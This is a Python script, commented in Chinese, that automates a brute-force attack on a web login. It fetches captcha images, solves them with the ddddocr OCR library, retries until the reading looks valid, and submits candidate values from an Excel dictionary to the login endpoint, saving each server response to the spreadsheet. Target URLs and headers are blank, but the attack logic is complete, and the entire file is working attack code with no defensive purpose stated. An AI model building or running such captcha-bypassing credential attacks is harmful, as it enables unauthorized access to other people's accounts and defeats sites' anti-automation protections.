import requests
import json
import base64
from ddddocr import DdddOcr
import openpyxl
xlsxdata = []
# 发送固定的POST请求
url = ""
file_path='1.txt'#密码字典位置
proxy_auth = {
    'http': f'',
    'https': f''
}
# 设置请求头
headers = {

}
# 发送POST请求
#有2的是发送爆破数据包的

def sendModule():
    #response = requests.post(url, headers=headers,proxies=proxy_auth)
    response = requests.post(url, headers=headers)
    return response
def verificationCodeRecognition(base64_img):
    base64_image = base64_img
    base64_data = base64_image.split(",")[1]
    # 2. 将 base64 数据解码为二进制数据
    image_data = base64.b64decode(base64_data)
    result = ocr.classification(image_data)
    return result



def webIdentificationModule():#验证码申请和识别是单独成立的
    while True:
        response=sendModule()#申请验证码
        #数据返回+数据识别

        if response.status_code == 200:
            #print("POST 请求成功!")
            # 将响应内容解析为 JSON 格式
            response_data = response.json()
            response.close()#数据包关闭，开始进行数据分析
            # 提取 token 和 base64img
            token = response_data.get("imgToken")#这个是不变的
            base64_img = response_data.get("base64Img")
            result = verificationCodeRecognition(base64_img=base64_img)#验证码识别
            result2 = verificationCodeRecognition(base64_img=base64_img)
            if result==result2:
                if len(result) != 4:#注意：即便是识别为4也可能验证码错误，这个就去xlsx手动第二次发送
                    #print(f'验证码识别错误：{result}')
                    continue
                else:
                    imgToken = token
                    return result, imgToken
            else:
                #print('验证码校验错误')
                continue
        else:
            #print(f"POST 请求失败, 状态码: {response.status_code}")
            response.close()
            continue









def sendingBlasting(result,password,imgToken):#发送爆破
    url2 = ""
    #print('sendingBlasting:',password)
    # 请求头
    #"Cookie": "JSESSIONID=a47464e4-7a50-432c-a9cd-85565c06fc12",
    headers2 = {
    }
    # 数据包
    data2 = {
        "username": password,
        "password": "",
        "verifyCode": result,
        "imgToken": imgToken
    }
    #response2 = requests.post(url=url2, headers=headers2, data=data2, proxies=proxy_auth)
    response2 = requests.post(url=url2, headers=headers2, data=data2)
    response_data2 = response2.json()
    response2.close()
    sendingBlastingResult=response_data2
    #print(sendingBlastingResult)
    return sendingBlastingResult,password

        #print(response_data2)



def cryptographicDictionary():
    wb = openpyxl.load_workbook("")
    sheet = wb.active
    #sheet_name = 'Sheet1'  # 工作表名称
    start_row = 2  # 从第三行开始读取
    start_col = 2  # 从第二列开始读取
    for row in sheet.iter_rows(min_row=start_row, min_col=start_col, max_col=start_col, values_only=True):
        if row[0] is None:  # 如果当前单元格为空，跳过
            continue
        #xlsxdata.append(row[0])
        jiamiusername=str(row[0])
        sendingBlastingResult={'msg':'验证码错误!'}
        try:
            while sendingBlastingResult.get("msg") == '验证码错误!':
                result, imgToken = webIdentificationModule()  # 获取验证码(单独于爆破之外)
                sendingBlastingResult, password = sendingBlasting(result=result, password=jiamiusername,imgToken=imgToken)  # 发送爆破数据
            print('------------------')
            print(password)
            print(sendingBlastingResult)
            print('------------------')
            xlsxdata.append(str(sendingBlastingResult))
              # 格式转换
        except requests.exceptions.SSLError as e:
            continue
    #print('数据整体处理完毕，开始进入保存环节')
    writeXlsx(sheet=sheet,wb=wb,xlsxdata=xlsxdata)
    # 保存更改



def writeXlsx(sheet,wb,xlsxdata):
    # 数据续写，添加新列
    # 写入第四列
    #value = str(xlsxdata[0])
    for index, value in enumerate(xlsxdata, start=2):
        sheet.cell(row=index, column=3, value=value)
    wb.save("")


if __name__ == '__main__':
    ocr = DdddOcr()#识别模块启动
    cryptographicDictionary()

